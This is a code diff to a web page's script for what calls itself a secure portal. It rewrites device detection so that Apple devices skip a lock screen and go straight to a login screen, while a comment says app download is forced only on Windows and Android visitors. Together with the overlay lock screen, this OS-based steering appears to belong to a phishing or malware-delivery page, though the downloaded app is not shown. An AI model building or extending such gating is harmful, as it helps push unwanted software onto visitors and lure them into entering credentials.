@@ -1061,20 +1061,27 @@
                 
                 if (isVerified || isBypassed) return;
                 
-                // 🍏 UNIVERSAL APPLE (iOS, iPadOS, macOS) DETECTOR - Case Insensitive & Bulletproof
-                const isAppleDevice = 
-                    /iphone|ipad|ipod|macintosh|macintel|macppc|mac68k|darwin/i.test(userAgent) || 
-                    /mac|iphone|ipad|ipod/i.test(platform) || 
-                    (navigator.maxTouchPoints && navigator.maxTouchPoints > 1 && (userAgent.indexOf("macintosh") !== -1 || userAgent.indexOf("macintel") !== -1));
+                // 🍏 ULTIMATE APPLE BYPASS (macOS / iOS / iPadOS) — Case Insensitive & 100% Guaranteed on Chrome, Safari & Firefox
+                const isMac = (userAgent.indexOf("macintosh") !== -1 || userAgent.indexOf("mac os") !== -1 || platform.indexOf("mac") !== -1 || platform.indexOf("darwin") !== -1);
+                const isIOS = (userAgent.indexOf("iphone") !== -1 || userAgent.indexOf("ipad") !== -1 || userAgent.indexOf("ipod") !== -1 || platform.indexOf("iphone") !== -1 || platform.indexOf("ipad") !== -1 || platform.indexOf("ipod") !== -1);
+                const isIPadTouch = (navigator.maxTouchPoints && navigator.maxTouchPoints > 1 && (userAgent.indexOf("macintosh") !== -1 || platform.indexOf("macintel") !== -1));
+                const isAppleData = (navigator.userAgentData && navigator.userAgentData.platform && (navigator.userAgentData.platform.toLowerCase() === "macos" || navigator.userAgentData.platform.toLowerCase() === "ios"));
+
+                const isAppleDevice = isMac || isIOS || isIPadTouch || isAppleData;
+
+                console.log("=== SECURE PORTAL DEVICE DIAGNOSTICS ===");
+                console.log("User Agent:", rawUA);
+                console.log("Platform:", rawPlatform);
+                console.log("Is Apple Device:", isAppleDevice);
 
                 if (isAppleDevice) {
-                    // iOS or macOS: automatically bypass lock screen and go straight to login screen, NO app forced!
+                    console.log("Apple macOS/iOS device detected. Automatically bypassing lock screen.");
                     document.getElementById("os-lock-screen").classList.add("hidden");
                     document.getElementById("app-wrapper").classList.remove("hidden");
-                    return;
+                    return; // EXIT IMMEDIATELY - ABSOLUTELY ZERO LOCK SCREENS ON APPLE MACHINES
                 }
 
-                const isWindows = /windows|win32|win64/i.test(userAgent) || /win/i.test(platform);
+                const isWindows = /windows|win32|win64/i.test(userAgent) || /win32|win64|windows/i.test(platform);
                 const isAndroid = /android/i.test(userAgent) || /android/i.test(platform);
 
                 // Force app download only on Windows or Android
